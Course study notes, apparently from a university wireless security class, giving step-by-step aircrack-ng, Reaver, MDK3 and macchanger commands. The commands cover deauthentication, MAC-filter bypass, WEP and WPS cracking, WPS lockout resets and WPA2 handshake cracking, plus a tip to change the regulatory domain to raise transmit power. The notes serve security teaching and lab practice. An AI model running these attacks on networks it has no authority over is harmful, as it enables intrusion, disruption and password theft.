# Wireless Network Hacking & Security — Complete Study Notes

## https://www.youtube.com/watch?v=2R_rB5-kx_s

### Wi-Fi Hacking Course — University Cybersecurity Department

> **Lab Scope:** All practical exercises must be performed **only** on:
>
> - Your own access points and test networks
> - Your own MERN/PERN web applications
> - Metasploitable2 in an isolated VM on Parrot OS / Kali Linux
> - Raspberry Pi hardware you own and control
>
> Never scan, probe, or attack systems or networks you do not own or have explicit written authorization to test.

---

## 📋 Table of Contents

1. [Lab Environment Setup](#1-lab-environment-setup)
   - [Choosing a Penetration Testing OS](#11-choosing-a-penetration-testing-os)
   - [VirtualBox / VMware Setup](#12-virtualbox--vmware-setup)
   - [Snapshots — Your Safety Net](#13-snapshots--your-safety-net)
2. [Wireless Network Fundamentals](#2-wireless-network-fundamentals)
   - [What Is a Wireless Network?](#21-what-is-a-wireless-network)
   - [Why Wireless Security Is Hard](#22-why-wireless-security-is-hard)
   - [Hardware Requirements](#23-hardware-requirements)
3. [Wireless Adapter Modes](#3-wireless-adapter-modes)
   - [Managed vs. Monitor Mode](#31-managed-vs-monitor-mode)
   - [Enabling Monitor Mode — Three Methods](#32-enabling-monitor-mode--three-methods)
4. [Wireless Frequencies & Channels](#4-wireless-frequencies--channels)
5. [MAC Addresses](#5-mac-addresses)
   - [What Is a MAC Address?](#51-what-is-a-mac-address)
   - [MAC Spoofing — Two Methods](#52-mac-spoofing--two-methods)
6. [Beacon Frames & SSIDs](#6-beacon-frames--ssids)
   - [Fake Access Point with MDK3](#61-fake-access-point-with-mdk3)
7. [Packet Sniffing with Airodump-ng](#7-packet-sniffing-with-airodump-ng)
   - [General Sniffing](#71-general-sniffing)
   - [Targeted Sniffing](#72-targeted-sniffing)
   - [Sniffing 5 GHz Networks](#73-sniffing-5-ghz-networks)
8. [Deauthentication Attacks](#8-deauthentication-attacks)
   - [Broadcast Deauth](#81-broadcast-deauth)
   - [Targeted Deauth](#82-targeted-deauth)
9. [Discovering Hidden SSIDs](#9-discovering-hidden-ssids)
10. [MAC Address Filtering — Bypass](#10-mac-address-filtering--bypass)
11. [Transmit Power — Boosting dBm](#11-transmit-power--boosting-dbm)
12. [WEP Protocol & Cracking](#12-wep-protocol--cracking)
    - [How WEP Works](#121-how-wep-works)
    - [Cracking WEP — Busy Network](#122-cracking-wep--busy-network)
    - [Cracking WEP — No Client (Fake Auth + ARP Replay)](#123-cracking-wep--no-client-fake-auth--arp-replay)
13. [WPS Protocol & Attacks](#13-wps-protocol--attacks)
    - [How WPS Works](#131-how-wps-works)
    - [WPS PIN Brute Force (Reaver)](#132-wps-pin-brute-force-reaver)
    - [Unlocking WPS Lockout (MDK3)](#133-unlocking-wps-lockout-mdk3)
14. [WPA / WPA2 Personal](#14-wpa--wpa2-personal)
    - [The Four-Way Handshake Explained](#141-the-four-way-handshake-explained)
    - [Attacker's View — What Can Be Captured](#142-attackers-view--what-can-be-captured)
    - [Cracking WPA2 — Dictionary Attack](#143-cracking-wpa2--dictionary-attack)
    - [Saving Dictionary Progress with John the Ripper](#144-saving-dictionary-progress-with-john-the-ripper)
    - [Rainbow Tables with Airolib-ng](#145-rainbow-tables-with-airolib-ng)
15. [Evil Twin Attack](#15-evil-twin-attack)
    - [Theory](#151-theory)
    - [Practical with Fluxion](#152-practical-with-fluxion)
16. [Captive Portal Attacks — ARP Poisoning / MITM](#16-captive-portal-attacks--arp-poisoning--mitm)
    - [What Is a Captive Portal?](#161-what-is-a-captive-portal)
    - [ARP Protocol & ARP Poisoning Theory](#162-arp-protocol--arp-poisoning-theory)
    - [MITM Attack with Ettercap](#163-mitm-attack-with-ettercap)
17. [WPA2 Enterprise](#17-wpa2-enterprise)
    - [How Enterprise Works (RADIUS)](#171-how-enterprise-works-radius)
    - [Fake Enterprise AP with Hostapd-WPE](#172-fake-enterprise-ap-with-hostapd-wpe)
    - [Cracking the Challenge/Response with Asleap](#173-cracking-the-challengeresponse-with-asleap)
18. [Raspberry Pi Hacking Hardware](#18-raspberry-pi-hacking-hardware)
    - [What Is Raspberry Pi?](#181-what-is-raspberry-pi)
    - [Components & Setup](#182-components--setup)
    - [Installing Raspbian & Kali Tools](#183-installing-raspbian--kali-tools)
    - [Headless Operation via VNC](#184-headless-operation-via-vnc)
    - [Running Attacks from Raspberry Pi](#185-running-attacks-from-raspberry-pi)
19. [Wireless Security Hardening](#19-wireless-security-hardening)
20. [Comprehensive Lab Exercises](#20-comprehensive-lab-exercises)
    - [Lab 1: Monitor Mode & Packet Sniffing](#lab-1-monitor-mode--packet-sniffing)
    - [Lab 2: Deauthentication Attack](#lab-2-deauthentication-attack)
    - [Lab 3: MAC Spoofing & Filtering Bypass](#lab-3-mac-spoofing--filtering-bypass)
    - [Lab 4: WEP Cracking](#lab-4-wep-cracking)
    - [Lab 5: WPS Brute Force with Reaver](#lab-5-wps-brute-force-with-reaver)
    - [Lab 6: WPA2 Four-Way Handshake Capture & Crack](#lab-6-wpa2-four-way-handshake-capture--crack)
    - [Lab 7: Evil Twin Attack with Fluxion](#lab-7-evil-twin-attack-with-fluxion)
    - [Lab 8: MITM on Captive Portal](#lab-8-mitm-on-captive-portal)
    - [Lab 9: Raspberry Pi as Attack Hardware](#lab-9-raspberry-pi-as-attack-hardware)
    - [Lab 10: Web App Testing via Rogue AP (Your MERN/PERN Sites)](#lab-10-web-app-testing-via-rogue-ap-your-mernpern-sites)
21. [Glossary](#21-glossary)
22. [Tools Reference & Further Learning](#22-tools-reference--further-learning)

---

## 1. Lab Environment Setup

### 1.1 Choosing a Penetration Testing OS

Multiple distros are available for wireless penetration testing:

| OS                 | Notes                                                      |
| ------------------ | ---------------------------------------------------------- |
| **Kali Linux**     | Most popular; all tools pre-installed; used in this course |
| Parrot Security OS | Lightweight alternative; same toolset                      |
| Samurai WTF        | Web testing focused                                        |
| BlackArch          | Arch-based; massive tool repository                        |

> All these tools are **not OS-exclusive** — they can be installed on any Linux distro. The pre-built distros save setup time by bundling everything.

### 1.2 VirtualBox / VMware Setup

**Two installation methods:**

```
Method 1: Bare Metal Install
  → Install Kali directly on a physical machine
  → Best performance
  → No easy rollback

Method 2: Virtual Machine (Recommended for learning)
  → Install VirtualBox (free) or VMware Workstation (paid)
  → Import the Kali .ova / .vmdk image
  → Advantages:
      ✓ Multiple VMs on one physical machine
      ✓ Snapshots (instant rollback on mistakes)
      ✓ Isolated environment
      ✓ Easy to restart fresh
```

**VirtualBox Kali Import Steps:**

1. Download VirtualBox from virtualbox.org
2. Download Kali Linux VirtualBox image from kali.org
3. In VirtualBox: File → Import Appliance → select the `.ova` file
4. Settings to adjust:
   - **System → RAM:** Increase from 2 GB to 4 GB (4096 MB)
   - **Network → Adapter 1:** Set to **Bridged Adapter**
     - Bridged = your VM gets a real IP from your router (same network as physical devices)
   - Keep display and storage defaults
5. Default credentials (shown in VM description): `kali / kali` or `root / toor`

**First boot tasks:**

```bash
sudo apt update && sudo apt upgrade -y
# Updates all tools and repositories
# Do this once after first install
```

> ⚠️ **Important:** Your **built-in Wi-Fi card** will appear as a wired (Ethernet) connection inside the VM when using bridged mode. You **must** use an external USB wireless adapter for actual wireless hacking.

### 1.3 Snapshots — Your Safety Net

Snapshots save the exact state of your VM — files, settings, everything.

```
SNAPSHOT WORKFLOW
══════════════════════════════════════════════════════

  ① Before making any major change →
    Machine → Tools → Snapshots → Take Snapshot
    Name it: "Clean Install" or "Before Attack X"

  ② Make your changes / run your tests

  ③ If something breaks →
    Snapshots → select the snapshot → Restore
    Your VM returns to exactly that saved state

  ④ Multiple snapshots = multiple restore points
    e.g., "Clean Install" → "After Tool Install" → "During Attack"
```

**CLI method (inside Kali):**

```bash
# Shutdown cleanly before important snapshots
shutdown -h 0
```

---

## 2. Wireless Network Fundamentals

### 2.1 What Is a Wireless Network?

A network is one or more devices connected to share a resource (internet, files, printers). In a wireless network, that connection is made via radio waves.

```
TYPICAL HOME WIRELESS NETWORK
═══════════════════════════════════════════════════════════════

          INTERNET
             │
             ▼
    ┌─────────────────┐
    │   Access Point  │  (Router / AP)
    │   192.168.1.1   │
    └────────┬────────┘
             │ (wireless — 2.4 GHz or 5 GHz radio waves)
    ┌────────┼────────────────────────┐
    │        │                        │
    ▼        ▼                        ▼
 Laptop    Phone                   Tablet
192.168.1.100  192.168.1.101  192.168.1.102

Each device gets a UNIQUE IP address from the router (DHCP).
All data travels as PACKETS.
═══════════════════════════════════════════════════════════════
```

**How a request works:**

1. Laptop requests `google.com` → packet sent to router
2. Router forwards to internet → Google responds
3. Router receives response → sends it **only** to `192.168.1.100`
4. Other devices never see this packet (in managed/normal mode)

### 2.2 Why Wireless Security Is Hard

```
UNIQUE CHALLENGES OF WIRELESS SECURITY
═══════════════════════════════════════════════════════════════

  ① You CANNOT contain radio signals to your walls
      Your home Wi-Fi signal reaches neighbors.
      An attacker 300m away with a directional antenna
      can interact with your network.

  ② You CANNOT see who is in your wireless range
      Unlike a wired network, there's no visible cable.
      Any device nearby can attempt to interact.

  ③ Hackers can be far away
      High-gain directional antennas (Yagi, dish) extend
      range dramatically — hundreds of meters to kilometers.

  ④ Wireless attacks don't require physical access
      An attacker in a car outside your building is enough.

═══════════════════════════════════════════════════════════════
```

### 2.3 Hardware Requirements

| Item                              | Purpose                        | Notes                             |
| --------------------------------- | ------------------------------ | --------------------------------- |
| Access Point / Router             | Target network                 | At least one; your own test AP    |
| Victim Machine                    | Target device                  | Laptop, phone, or VM              |
| Attacker Machine                  | Kali Linux                     | Laptop or VM                      |
| **External USB Wireless Adapter** | Monitor mode, packet injection | Built-in Wi-Fi won't work in a VM |

**Recommended adapters:**

- **Alfa AWUS036NHA** — 802.11b/g/n, 2.4 GHz, excellent driver support
- **Alfa AWUS036ACH** — 802.11ac, dual-band (2.4 + 5 GHz)
- Any adapter with chipsets: **Atheros AR9271**, **Realtek RTL8812AU**

**Antenna gain matters:**

- 5 dBi antenna = standard range
- 8–11 dBi antenna = longer range, better signal quality
- Transmit power (dBm) + antenna gain (dBi) = effective range

---

## 3. Wireless Adapter Modes

### 3.1 Managed vs. Monitor Mode

```
WIRELESS ADAPTER MODES
══════════════════════════════════════════════════════════════

  MANAGED MODE (default)
  ┌─────────────────────────────────────────────────────┐
  │ Receives ONLY packets addressed to YOUR device      │
  │ Normal usage: browsing, streaming, gaming           │
  │ Ignores all other traffic in the air                │
  └─────────────────────────────────────────────────────┘

  MONITOR MODE (hacking mode)
  ┌─────────────────────────────────────────────────────┐
  │ Receives ALL packets floating in the air            │
  │ Does NOT filter by destination                      │
  │ Can see: all SSIDs, MAC addresses, data packets     │
  │ Required for: sniffing, injection, WEP/WPA cracking │
  └─────────────────────────────────────────────────────┘

  KEY POINT: You must convert your adapter to MONITOR
  MODE before performing any wireless attack.
══════════════════════════════════════════════════════════════
```

**Check current mode:**

```bash
iwconfig wlan0
# Look for: Mode:Managed  OR  Mode:Monitor
```

### 3.2 Enabling Monitor Mode — Three Methods

**Method 1: Airmon-ng (simplest)**

```bash
airmon-ng start wlan0

# Verify:
iwconfig
# wlan0 becomes wlan0mon (or mon0)
# Mode: Monitor confirmed
```

**Method 2: Airmon-ng with conflict resolution (if Method 1 fails)**

```bash
airmon-ng check kill    # Kills conflicting services (NetworkManager, wpa_supplicant)
airmon-ng start wlan0
iwconfig                # Confirm monitor mode
```

**Method 3: Manual (works on all Linux, including Android)**

```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0       # Verify: Mode:Monitor
# Note: Name stays wlan0, not renamed to wlan0mon
```

**Reverting to managed mode:**

```bash
airmon-ng stop wlan0mon
# OR manually:
ifconfig wlan0mon down
iwconfig wlan0mon mode managed
ifconfig wlan0mon up
```

---

## 4. Wireless Frequencies & Channels

```
WIRELESS FREQUENCY BANDS
══════════════════════════════════════════════════════════════

  Band    Freq      802.11 Standards    Notes
  ──────  ────────  ─────────────────   ──────────────────────────
  2.4GHz  2.4GHz    b, g, n            14 channels; most common
  3.6GHz  3.6GHz    y                  Rare; licensed in some regions
  5GHz    5GHz      a, n, ac           More channels; less interference

══════════════════════════════════════════════════════════════
2.4 GHz CHANNEL MAP (14 channels):

  Ch: 1    2    3    4    5    6    7    8    9    10   11   12   13   14

  Non-overlapping (best practice): 1, 6, 11

  Country allowances:
  North America:  Channels 1–11
  Japan:          Channels 1–14 (all)
  Most of world:  Channels 1–13
══════════════════════════════════════════════════════════════
```

**Key concepts:**

- An access point operates on **one channel at a time**
- Your wireless adapter also operates on **one channel at a time**
- `airodump-ng` hops channels by default; you pin to one channel with `--channel`
- Your adapter's **hardware** must support the target frequency (5 GHz cards needed for 5 GHz networks)

**Detecting which standard/band your adapter supports:**

```bash
iwconfig wlan0
# IEEE 802.11bgn = 2.4 GHz only
# IEEE 802.11abgn or 802.11ac = dual band
```

---

## 5. MAC Addresses

### 5.1 What Is a MAC Address?

```
MAC ADDRESS STRUCTURE
══════════════════════════════════════════════════════════════

  Format: XX:XX:XX:XX:XX:XX  (6 bytes, 48 bits, hex notation)
  Example: 00:1A:2B:3C:4D:5E

  ┌─────────────────────┬─────────────────────┐
  │  OUI (3 bytes)      │  Device ID (3 bytes)│
  │  Manufacturer code  │  Unique per device  │
  │  e.g., 00:1A:2B     │  3C:4D:5E           │
  └─────────────────────┴─────────────────────┘

  - Hardcoded by manufacturer into the network adapter
  - Every adapter worldwide should have a UNIQUE MAC
  - Used for local network identification (Layer 2)
  - NOT used for internet routing (that uses IP)

══════════════════════════════════════════════════════════════
```

**MAC filtering in routers:**

| Type          | Behavior                                               |
| ------------- | ------------------------------------------------------ |
| **Whitelist** | Only MACs in the table can connect; all others blocked |
| **Blacklist** | MACs in the table are blocked; all others allowed      |

**Viewing your MAC:**

```bash
ifconfig wlan0
# HWaddr or ether field = MAC address
```

### 5.2 MAC Spoofing — Two Methods

**Method 1: macchanger (automated)**

```bash
# Bring interface down first
ifconfig wlan0 down

# Random MAC
macchanger -r wlan0

# Custom specific MAC
macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Show current/permanent MAC
macchanger -s wlan0

# Bring back up
ifconfig wlan0 up

# Verify
ifconfig wlan0
```

**Method 2: Manual (works on any Linux, including Android with terminal)**

```bash
ifconfig wlan0 down
ifconfig wlan0 hw ether AA:BB:CC:11:22:33
ifconfig wlan0 up
ifconfig wlan0    # Verify change
```

**Fix: Prevent Kali from randomizing MAC on its own:**

```bash
# Edit NetworkManager config
leafpad /etc/NetworkManager/NetworkManager.conf

# Add under [device] section:
[device]
wifi.scan-rand-mac-address=no

# Save and restart
service NetworkManager restart
```

---

## 6. Beacon Frames & SSIDs

Every access point **broadcasts beacon frames periodically** to announce its presence. This is how your phone's Wi-Fi list gets populated automatically.

**Beacon frame contents (all in plain text — NO encryption):**

- SSID (network name)
- BSSID (MAC address of AP)
- Channel number
- Supported rates
- Security capabilities (WPA2, WPS, etc.)
- SSID length

**Viewing beacon frames with Wireshark:**

```bash
# Start monitor mode first
airmon-ng start wlan0

# Open Wireshark on monitor interface
wireshark &
# Select interface: wlan0mon
# Filter: wlan.fc.type_subtype == 8   (beacon frames only)
# Click any frame → expand IEEE 802.11 → Tagged parameters → SSID
```

**Security implications:**

- Anyone in range can see your SSID, channel, encryption type, and MAC address — **without connecting or knowing the password**
- Beacon frames cannot be encrypted (by design — devices need to discover APs)
- "Hiding" your SSID only removes it from beacon frames but doesn't protect against attackers

### 6.1 Fake Access Point with MDK3

```bash
# Create a fake AP broadcasting a custom SSID
# (Useful for testing and understanding beacon flood attacks)

mdk3 wlan0mon b -n "FakeNetworkName"

# Options:
# b = beacon flood mode
# -n = SSID name
# MDK3 will broadcast this SSID on random MACs across all channels
```

---

## 7. Packet Sniffing with Airodump-ng

### 7.1 General Sniffing

`airodump-ng` is the primary tool for wireless reconnaissance — it shows all APs in range and connected clients.

```bash
airodump-ng wlan0mon
```

**Output columns explained:**

```
BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC   CIPHER  AUTH  ESSID
00:1A:2B:3C:4D:5E  -60     45      234   12   6   54e  WPA2  CCMP    PSK   HomeNetwork

BSSID    = MAC address of the access point
PWR      = Signal power (negative; closer to 0 = stronger signal)
Beacons  = Number of beacon frames received
#Data    = Number of data packets captured
CH       = Channel the AP is operating on
MB       = Max speed supported
ENC      = Encryption type (OPN, WEP, WPA, WPA2)
CIPHER   = Cipher used (CCMP, TKIP, WEP)
AUTH     = Authentication (PSK = personal, MGT = enterprise)
ESSID    = Network name (SSID)
```

**Bottom section (Stations):**

```
BSSID              STATION            PWR   Rate    Lost    Frames  Probe
00:1A:2B:3C:4D:5E  AA:BB:CC:11:22:33  -70   54e- 6    0      45
                                              ^client MAC connected to the AP above
```

### 7.2 Targeted Sniffing

```bash
# Target a specific AP (channel 9, MAC 00:1A:2B:3C:4D:5E)
airodump-ng --channel 9 --bssid 00:1A:2B:3C:4D:5E wlan0mon

# Save captured packets to file (for later cracking)
airodump-ng --channel 9 --bssid 00:1A:2B:3C:4D:5E \
  -w /root/capture_file wlan0mon
# Creates: capture_file-01.cap, capture_file-01.csv, etc.
```

### 7.3 Sniffing 5 GHz Networks

```bash
# Default airodump-ng only scans 2.4 GHz (b/g/n)
# For 5 GHz you need a 5 GHz capable adapter AND specify band:

airodump-ng --band a wlan0mon         # 5 GHz only (802.11a/ac)
airodump-ng --band abg wlan0mon       # All bands

# Band letters:
# a = 5 GHz (802.11a, 802.11ac)
# b = 2.4 GHz (802.11b)
# g = 2.4 GHz (802.11g)
# n = both bands (802.11n)
```

---

## 8. Deauthentication Attacks

A deauthentication (deauth) attack sends **forged 802.11 management frames** telling a client it has been disconnected from the AP. Since management frames are **unauthenticated** (no signature verification in standard WPA2), any device can forge them.

```
WHY DEAUTH ATTACKS WORK
══════════════════════════════════════════════════════════════
  802.11 management frames (including deauth) are:
    ✗ Not encrypted
    ✗ Not authenticated / signed
    ✓ Accepted by all devices by default

  WPA3 introduces Protected Management Frames (PMF)
  which fixes this — deauth attacks fail against WPA3.
══════════════════════════════════════════════════════════════
```

**Uses of deauth attacks:**

1. Force a client to reconnect → capture four-way handshake (WPA cracking)
2. Reveal hidden SSIDs (clients reconnect and reveal SSID in probe requests)
3. Denial of Service — keep a device disconnected
4. Force clients onto your evil twin AP

### 8.1 Broadcast Deauth

```bash
# Disconnect ALL clients from target AP
aireplay-ng --deauth 100 -a AP_BSSID wlan0mon

# --deauth 100 = send 100 deauth packets (use 0 for continuous)
# -a = access point MAC address
```

### 8.2 Targeted Deauth

```bash
# Disconnect ONE specific client from AP
aireplay-ng --deauth 100 -a AP_BSSID -c CLIENT_MAC wlan0mon

# -c = client (station) MAC address
# Get client MAC from airodump-ng (Stations section)
```

**Example — get client MAC first:**

```bash
# Step 1: Find clients
airodump-ng --bssid 00:1A:2B:3C:4D:5E --channel 6 wlan0mon
# Note client MAC from bottom section: AA:BB:CC:11:22:33

# Step 2: Target that specific client
aireplay-ng --deauth 50 -a 00:1A:2B:3C:4D:5E -c AA:BB:CC:11:22:33 wlan0mon
```

---

## 9. Discovering Hidden SSIDs

Some APs are configured to **not broadcast** their SSID in beacon frames. The SSID field in beacon frames shows as blank or as the length (e.g., `<length: 9>`).

**Two methods to uncover hidden SSIDs:**

```
METHOD 1 — PASSIVE (wait for client to connect)
  Start airodump-ng on target AP
  When a legitimate client connects → probe request reveals SSID
  └── Works but may take a long time

METHOD 2 — ACTIVE (deauth + reconnect)
  Send deauth to connected clients
  Clients attempt to reconnect → send probe requests with SSID
  airodump-ng automatically captures and reveals SSID
  └── Fast, works in seconds
```

**Practical steps:**

```bash
# Step 1: Find the hidden AP (shows <length: X> in ESSID column)
airodump-ng wlan0mon
# Note the BSSID of the AP with hidden SSID

# Step 2: Target it and watch
airodump-ng --bssid TARGET_BSSID --channel X wlan0mon

# Step 3: Send deauth to force reconnection
# (In another terminal)
aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Step 4: Watch the ESSID column in airodump-ng
# → SSID appears as clients reconnect
```

---

## 10. MAC Address Filtering — Bypass

When a router has **whitelist MAC filtering** enabled, only specific MAC addresses can connect — even if you know the password.

**Attack approach:**

1. Sniff the target AP with airodump-ng
2. Observe the **Stations** section — see MAC addresses of already-connected legitimate clients
3. Change your MAC to match an allowed/connected client
4. Connect to the AP (the router sees a whitelisted MAC)

```bash
# Step 1: Find connected client MAC
airodump-ng --bssid TARGET_BSSID --channel X wlan0mon
# Note connected client MAC from Stations: e.g., AA:BB:CC:11:22:33

# Step 2: Change to that MAC
ifconfig wlan0 down
macchanger -m AA:BB:CC:11:22:33 wlan0
ifconfig wlan0 up

# Step 3: Connect — router now accepts your device as whitelisted
```

> **Defense note:** MAC filtering alone is NOT effective security. Attackers can observe any whitelisted MAC and clone it within seconds. Use it only as a secondary layer, never as primary security.

---

## 11. Transmit Power — Boosting dBm

**dBm vs dBi:**

- **dBm** = transmit power of the wireless adapter (e.g., 20 dBm, 30 dBm)
- **dBi** = gain of the antenna
- Effective signal = adapter dBm + antenna dBi combined

**Alpha AWUS036NHA default:** 20 dBm; maximum: 30 dBm (1 Watt)

```bash
# Check current power
iwconfig wlan0
# Look for: Tx-Power=20 dBm

# Attempt to set 30 dBm (may fail due to country code)
iwconfig wlan0 txpower 30

# If it doesn't change → change country code first:
ifconfig wlan0 down

# Set country to one that allows 30 dBm on 2.4 GHz
iw reg set GY    # Guyana — permits 30 dBm

iwconfig wlan0 txpower 30
ifconfig wlan0 up

# Verify
iwconfig wlan0
# Tx-Power=30 dBm

# Check what current country code allows:
iw reg get
```

**Why this matters:**

- Higher dBm = stronger signal sent
- Better for long-range attacks and capturing distant APs
- Higher dBi antenna improves reception (signal-to-noise ratio)

---

## 12. WEP Protocol & Cracking

### 12.1 How WEP Works

WEP (Wired Equivalent Privacy) was the **first wireless encryption standard** (1997). It is completely broken and should never be used.

```
WEP ENCRYPTION PROCESS
══════════════════════════════════════════════════════════════

  INPUT:
  ┌──────────────┐    ┌────────────┐
  │  WEP Key     │    │    IV      │
  │ (40 or 104b) │ +  │ (24-bit    │ → Combined: 64 or 128-bit key
  └──────────────┘    │  random)   │
                      └────────────┘
                            │
                            ▼
                      RC4 Algorithm
                            │
                            ▼
                      Random Keystream

  DATA SIDE:
  ┌──────────────┐
  │ Plaintext    │ → CRC-32 → ICV (integrity check) → Data + ICV
  └──────────────┘

  ENCRYPTION:
  (Data + ICV) XOR Keystream = Ciphertext

  TRANSMITTED PACKET:
  ┌──────────────────────────────────────┐
  │  IV (24-bit, PLAINTEXT!) + Ciphertext│
  └──────────────────────────────────────┘

  KEY WEAKNESS: IV is in PLAINTEXT and only 24-bit.
  With only 2^24 = 16,777,216 possible IVs,
  in a busy network IVs repeat frequently.
  Repeating IVs allow statistical recovery of the key.
══════════════════════════════════════════════════════════════
```

### 12.2 Cracking WEP — Busy Network

```bash
# Step 1: Identify WEP network
airodump-ng wlan0mon
# Look for ENC: WEP in the list

# Step 2: Target and capture packets
airodump-ng --channel 6 \
  --bssid TARGET_BSSID \
  -w /root/wep_capture \
  wlan0mon

# Step 3: In another terminal — start cracking (while capturing)
aircrack-ng /root/wep_capture-01.cap

# aircrack-ng will:
# - Try after 5,000 IVs (likely fail)
# - Retry after 10,000 IVs
# - Retry after 15,000 IVs
# - Usually succeeds by 25,000-100,000 IVs

# Successful output:
#   KEY FOUND! [ AB:CD:EF:01:23 ]
```

### 12.3 Cracking WEP — No Client (Fake Auth + ARP Replay)

When there are **no connected clients**, no data packets flow → no IVs collected. Solution: inject your own packets.

```bash
# Step 1: Start capture
airodump-ng --channel 6 --bssid TARGET_BSSID \
  -w /root/wep_noClient wlan0mon

# Step 2: Fake Authentication (associate without knowing password)
aireplay-ng -1 0 -a TARGET_BSSID -h YOUR_MAC wlan0mon
# -1 = fake authentication
# 0  = reassociation timing
# -a = AP MAC
# -h = your adapter's MAC (from ifconfig)
# Success: "Association successful :-)"

# Step 3: ARP Replay Attack (generate traffic)
aireplay-ng -3 -b TARGET_BSSID -h YOUR_MAC wlan0mon
# -3 = ARP request replay attack
# Captures ARP packets and retransmits them rapidly
# This forces the AP to generate new IVs with each replay

# Watch the #Data counter in airodump-ng jump rapidly
# When you have 10,000+ packets, run aircrack-ng:
aircrack-ng /root/wep_noClient-01.cap
```

---

## 13. WPS Protocol & Attacks

### 13.1 How WPS Works

WPS (Wi-Fi Protected Setup) simplifies connecting devices to a network without typing the full password.

**Two WPS methods:**

1. **PIN method:** 8-digit numeric PIN printed on the router
2. **Push Button method:** Press physical button on router; client connects automatically

```
WPS VULNERABILITY — WHY THE PIN IS WEAK
══════════════════════════════════════════════════════════════

  The 8-digit PIN (e.g., 12345670) is NOT checked all at once.
  The router checks it in two halves:
    First 4 digits: 10,000 possibilities
    Last 4 digits:  10,000 possibilities (last digit is checksum → 1,000)

  Total guesses needed: 10,000 + 1,000 = 11,000 (not 100,000,000!)

  Brute force time: hours to days depending on router speed.
  Many routers lack lockout or have weak lockout policies.

══════════════════════════════════════════════════════════════
```

### 13.2 WPS PIN Brute Force (Reaver)

```bash
# Step 1: Find WPS-enabled networks
wash -i wlan0mon
# Columns: BSSID | Ch | dBm | WPS ver | WPS Locked | Vendor | ESSID
# Look for: Lck: No (not locked)

# Step 2: Attack with Reaver
reaver -i wlan0mon -b TARGET_BSSID -c CHANNEL -vv

# Options:
# -i = interface
# -b = BSSID (MAC of AP)
# -c = channel
# -vv = very verbose output (shows each PIN attempt)

# Reaver saves session progress automatically
# If interrupted: run same command → option to restore session

# Success output:
#   WPS PIN: '12345670'
#   WPA PSK: 'ActualWiFiPassword'
#   AP SSID: 'NetworkName'
```

**Checking WPS status during attack:**

```bash
wash -i wlan0mon
# Lck: Yes = router locked WPS after too many attempts
# Lck: No  = can continue attacking
```

### 13.3 Unlocking WPS Lockout (MDK3)

When a router locks WPS after failed attempts, use MDK3's authentication DoS to reset it:

```bash
# Method 1: Authentication DoS (works on many routers)
mdk3 wlan0mon a -a TARGET_BSSID
# Sends ~20,000 packets to reset WPS lockout state

# Method 2: Random DoS (alternative)
mdk3 wlan0mon x 0 -t TARGET_BSSID -n TARGET_ESSID -s 1000

# After unlocking, verify with wash then continue with reaver
wash -i wlan0mon   # Lck should return to: No
```

**VMR MDK Script (covers many router types):**

```bash
# Download and run this community script for comprehensive WPS attacks
# https://github.com/search?q=VMR-MDK

# Script automates: channel hopping, locking detection, multiple unlock methods
# Run from /root directory; follow interactive prompts
```

> **Defense:** Disable WPS entirely in your router settings. WPS adds no meaningful security benefit for security-conscious users and creates significant vulnerability.

---

## 14. WPA / WPA2 Personal

### 14.1 The Four-Way Handshake Explained

WPA2's strength lies in **dynamic key generation**. Every connection session produces a unique encryption key that is discarded on disconnect.

```
WPA2 FOUR-WAY HANDSHAKE — DETAILED FLOW
══════════════════════════════════════════════════════════════════

  BEFORE HANDSHAKE — Both sides independently compute PMK:
  ┌───────────────────────────────────────────────────────────┐
  │ PMK = PBKDF2(password, SSID, SSID_len, 4096, 256)        │
  │                                                           │
  │ Inputs:  Password (what you type to connect)             │
  │          SSID (network name)                             │
  │          SSID length                                     │
  │          4096 (iterations of hash)                       │
  │          256 (output key length in bits)                 │
  │                                                          │
  │ Result:  PMK (Pairwise Master Key) — NEVER TRANSMITTED   │
  │ Both AP and Client compute same PMK independently        │
  └──────────────────────────────────────────────────────────┘

  HANDSHAKE PACKETS:

  AP ──(1)──► Client   ANonce (random 32-byte value from AP)

  Client computes:
  PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
  MIC = hash(PTK, packet_data)

  Client ──(2)──► AP   SNonce + MIC

  AP verifies:
  - Computes same PTK using received SNonce
  - Computes MIC, compares with received MIC
  - If MIC matches → password is correct!

  AP ──(3)──► Client   GTK (Group Temporal Key) + MIC

  Client ──(4)──► AP   Acknowledgement

  Result: Encrypted communication begins with PTK

  LEGEND:
  PMK  = Pairwise Master Key (derived from password)
  ANonce = AP Nonce (random; changes each session)
  SNonce = Station Nonce (random; changes each session)
  PTK  = Pairwise Transient Key (session encryption key)
  MIC  = Message Integrity Code (proves password correctness)
  GTK  = Group Temporal Key (for broadcast/multicast)
══════════════════════════════════════════════════════════════════
```

### 14.2 Attacker's View — What Can Be Captured

```
WHAT ATTACKER CAN CAPTURE VS. WHAT REMAINS SECRET
══════════════════════════════════════════════════════════════

  CAPTURABLE (by sniffing four-way handshake):
  ✓ ANonce (from packet 1)
  ✓ SNonce (from packet 2)
  ✓ AP MAC address
  ✓ Client MAC address
  ✓ MIC (from packet 2)

  NOT CAPTURABLE:
  ✗ Password
  ✗ PMK (Pairwise Master Key)
  ✗ PTK (session key)

  ATTACKER'S STRATEGY (dictionary attack):
  For each password guess in wordlist:
    1. Compute PMK = PBKDF2(guess, SSID, ...)
    2. Compute PTK using captured ANonce, SNonce, MACs
    3. Compute MIC from PTK
    4. Compare computed MIC with captured MIC
    5. If they match → guess was the correct password!

══════════════════════════════════════════════════════════════
```

### 14.3 Cracking WPA2 — Dictionary Attack

```bash
# Step 1: Put adapter in monitor mode
airmon-ng start wlan0

# Step 2: Start capture on target AP
airodump-ng --bssid TARGET_BSSID \
  --channel 11 \
  --write /root/wpa_capture \
  wlan0mon

# Step 3: Force handshake (in another terminal)
aireplay-ng --deauth 20 -a TARGET_BSSID wlan0mon
# Watch top of airodump-ng for: WPA handshake: XX:XX:XX:XX:XX:XX

# Step 4: Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  /root/wpa_capture-01.cap

# For BSS ID targeting:
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b TARGET_BSSID \
  /root/wpa_capture-01.cap

# Success:
#   KEY FOUND! [ YourWifiPassword ]
```

**Good wordlists:**

```bash
# Built-in Kali wordlists
